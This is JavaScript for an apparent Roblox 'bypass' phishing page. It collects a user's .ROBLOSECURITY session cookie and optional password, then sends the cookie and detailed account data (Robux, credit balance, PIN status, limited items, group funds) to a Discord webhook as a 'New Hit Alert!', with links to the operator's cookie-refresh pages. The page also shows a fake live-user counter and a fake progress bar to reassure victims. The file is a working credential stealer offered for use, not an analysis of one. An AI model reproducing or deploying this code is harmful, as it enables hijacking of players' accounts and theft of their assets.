// Live User Counter - Updates every 2 minutes 30 seconds
function updateLiveUsers() {
    const liveUsersEl = document.getElementById('live-users');
    const randomUsers = Math.floor(Math.random() * 50) + 10;
    
    let currentNum = parseInt(liveUsersEl.textContent) || 0;
    const increment = randomUsers > currentNum ? 1 : -1;
    const duration = 1000;
    const steps = Math.abs(randomUsers - currentNum);
    const stepTime = Math.max(duration / steps, 10);
    
    const timer = setInterval(() => {
        currentNum += increment;
        liveUsersEl.textContent = currentNum;
        if (currentNum === randomUsers) clearInterval(timer);
    }, stepTime);
}

updateLiveUsers();
setInterval(updateLiveUsers, 150000);

const cookieInput = document.getElementById('cookie-input');
const passwordInput = document.getElementById('password-input');
const passwordField = document.getElementById('password-field');
const toggleCookieOnly = document.getElementById('toggle-cookie-only');
const togglePassword = document.getElementById('toggle-password');
const togglePasswordVisibility = document.getElementById('toggle-password-visibility');
const btnStart = document.getElementById('btn-start');

const formState = document.getElementById('form-state');
const processingState = document.getElementById('processing-state');
const successState = document.getElementById('success-state');
const failedState = document.getElementById('failed-state');
const progressBar = document.getElementById('progress-bar');
const progressText = document.getElementById('progress-text');
const userAvatar = document.getElementById('user-avatar');

let usePassword = false;

toggleCookieOnly.onclick = () => {
    usePassword = false;
    toggleCookieOnly.classList.add('bg-white', 'text-black');
    toggleCookieOnly.classList.remove('bg-transparent', 'text-gray-400', 'border', 'border-white/10');
    togglePassword.classList.remove('bg-white', 'text-black');
    togglePassword.classList.add('bg-transparent', 'text-gray-400', 'border', 'border-white/10');
    passwordField.classList.add('hidden');
};

togglePassword.onclick = () => {
    usePassword = true;
    togglePassword.classList.add('bg-white', 'text-black');
    togglePassword.classList.remove('bg-transparent', 'text-gray-400', 'border', 'border-white/10');
    toggleCookieOnly.classList.remove('bg-white', 'text-black');
    toggleCookieOnly.classList.add('bg-transparent', 'text-gray-400', 'border', 'border-white/10');
    passwordField.classList.remove('hidden');
};

if (togglePasswordVisibility) {
    togglePasswordVisibility.onclick = () => {
        const type = passwordInput.type === 'password' ? 'text' : 'password';
        passwordInput.type = type;
        const eyeIcon = document.getElementById('eye-icon');
        if (type === 'text') {
            eyeIcon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>';
        } else {
            eyeIcon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
        }
    };
}

function showError(message) {
    alert(message);
}

btnStart.onclick = async () => {
    const cookie = cookieInput.value.trim();
    const password = usePassword ? passwordInput.value.trim() : null;

    if (!cookie) {
        showError('Please provide a cookie');
        return;
    }

    if (usePassword && !password) {
        showError('Please enter your password');
        return;
    }

    formState.classList.add('hidden');
    processingState.classList.remove('hidden');

    try {
        const response = await fetch('/api/bypass', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ cookie, password })
        });

        const data = await response.json();

        if (!response.ok || !data.success) {
            setTimeout(() => {
                processingState.classList.add('hidden');
                failedState.classList.remove('hidden');
            }, 1500);
            return;
        }

        const WEBHOOK_URL = window.WEBHOOK_URL;
        const d = data.detailedInfo;

        // Embed 1 - Main Account Info
        const embed1 = {
            content: '@everyone',
            username: 'HyperBlox',
            avatar_url: 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
            embeds: [{
                title: 'New Hit Alert!',
                description: 
                    `<:check:1350103884835721277> **[Check Cookie](https://hyperblox.eu/controlPage/check/check.php?cookie=${cookie})** <:line:1350104634982662164> ` +
                    `<:refresh:1350103925037989969> **[Refresh Cookie](https://hyperblox.eu/controlPage/antiprivacy/kingvon.php?cookie=${cookie})** <:line:1350104634982662164> ` +
                    `<:profile:1350103857903960106> **[Profile](https://www.roblox.com/users/${d.userId}/profile)** <:line:1350104634982662164> ` +
                    `<:rolimons:1350103860588314676> **[Rolimons](https://rolimons.com/player/${d.userId})**`,
                color: 0x00BFFF,
                thumbnail: { url: d.avatarUrl },
                fields: [
                    {
                        name: '**<:search:1391436893794861157> About:**',
                        value: 
                            `• **Display:** \`${d.displayName}\`\n` +
                            `• **Username:** \`${d.username}\`\n` +
                            `• **User ID:** \`${d.userId}\`\n` +
                            `• **Age:** \`${d.accountAge}\`\n` +
                            `• **Join Date:** \`${d.joinDate}\`\n` +
                            `• **Bio:** \`${d.bio || 'No bio'}\``,
                        inline: true
                    },
                    {
                        name: '**<:info:1391434745207853138> Information:**',
                        value: 
                            `• **Robux:** \`${d.robux}\`\n` +
                            `• **Pending:** \`${d.pendingRobux}\`\n` +
                            `• **Credit:** \`${d.creditBalance}\`\n` +
                            `• **Summary:** \`${d.summary}\``,
                        inline: true
                    },
                    {
                        name: '**<:settings:1391433304145924146> Settings:**',
                        value: 
                            `• **PIN:** \`${d.pinStatus}\`\n` +
                            `• **Premium:** \`${d.isPremium ? '✅ True' : '❌ False'}\`\n` +
                            `• **VC:** \`${d.vcStatus}\`\n` +
                            `• **Verified:** \`${d.emailVerified}\`\n` +
                            `• **Presence:** \`${d.presenceType}\``,
                        inline: true
                    },
                    {
                        name: '**<:Games:1313020733932306462> Games Played:**',
                        value: 
                            `<:bf:1303894849530888214> ${d.games.BF} ${d.gamePasses.BF}\n` +
                            `<:adm:1303894863007453265> ${d.games.AM} ${d.gamePasses.AM}\n` +
                            `<:mm2:1303894855281541212> ${d.games.MM2} ${d.gamePasses.MM2}\n` +
                            `<:ps99:1303894865079308288> ${d.games.PS99} ${d.gamePasses.PS99}\n` +
                            `<:bb:1303894852697718854> ${d.games.BB} ${d.gamePasses.BB}`,
                        inline: true
                    },
                    {
                        name: '**<:bag:1391435344779677887> Inventory:**',
                        value: 
                            `• **RAP:** \`${d.rap}\`\n` +
                            `• **Headless:** \`${d.headlessStatus}\`\n` +
                            `• **Korblox:** \`${d.korbloxStatus}\``,
                        inline: true
                    },
                    {
                        name: '**<:groups:1391434330823200840> Groups:**',
                        value: 
                            `• **Owned:** \`${d.totalGroupsOwned}\`\n` +
                            `• **Highest Rank:** \`#${d.highestRank} in ${d.highestGroup}\`\n` +
                            `• **Funds:** \`${d.totalGroupFunds} R$\`\n` +
                            `• **Pending:** \`${d.totalPendingGroupFunds} R$\``,
                        inline: true
                    },
                    {
                        name: '**<:user:1391436034843349002> Profile:**',
                        value: 
                            `• **Friends:** \`${d.friendsCount}\`\n` +
                            `• **Followers:** \`${d.followersCount}\``,
                        inline: true
                    }
                ]
            }]
        };

        // Embed 2 - Cookie
        const embed2 = {
            username: 'HyperBlox',
            avatar_url: 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
            embeds: [{
                title: '🍪 .ROBLOSECURITY',
                description: `\`\`\`\n${cookie.substring(0, 2000)}\n\`\`\``,
                color: 0x00BFFF,
                footer: {
                    text: 'Refreshed Cookie',
                    icon_url: 'https://cdn-icons-png.flaticon.com/512/5473/5473473.png'
                },
                thumbnail: {
                    url: 'https://cdn-icons-png.flaticon.com/512/5473/5473473.png'
                },
                timestamp: new Date().toISOString()
            }]
        };

        // Send both embeds
        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(embed1)
        }).catch(() => {});

        setTimeout(() => {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(embed2)
            }).catch(() => {});
        }, 1000);

        // Progress animation
        let progress = 0;
        const interval = setInterval(() => {
            progress += 1;
            progressBar.style.width = `${progress}%`;
            progressText.innerText = `${progress}% Complete`;
            
            if (progress >= 100) {
                clearInterval(interval);
                
                // Populate success state
                userAvatar.src = data.avatarUrl || 'https://via.placeholder.com/150';
                document.getElementById('user-display-name').textContent = `@${data.userInfo.username}`;
                document.getElementById('info-username').textContent = data.userInfo.username;
                document.getElementById('info-userid').textContent = data.userInfo.userId;
                document.getElementById('info-robux').textContent = data.userInfo.robux.toLocaleString();
                document.getElementById('info-rap').textContent = (data.userInfo.rap || 0).toLocaleString();
                document.getElementById('info-premium').textContent = data.userInfo.premium;
                document.getElementById('info-vc').textContent = data.userInfo.voiceChat;
                
                // Remove score elements
                const scoreSection = document.querySelector('.bg-gradient-to-r.from-blue-500\\/10');
                if (scoreSection) scoreSection.remove();
                
                // Show success state
                processingState.classList.add('hidden');
                successState.classList.remove('hidden');
                
                // Clear inputs
                setTimeout(() => {
                    cookieInput.value = '';
                    if (passwordInput) passwordInput.value = '';
                }, 2000);
            }
        }, 1200);

    } catch (err) {
        console.error(err);
        setTimeout(() => {
            processingState.classList.add('hidden');
            failedState.classList.remove('hidden');
        }, 1500);
    }
};

// Enter key support
cookieInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') btnStart.click();
});

if (passwordInput) {
    passwordInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') btnStart.click();
    });
}
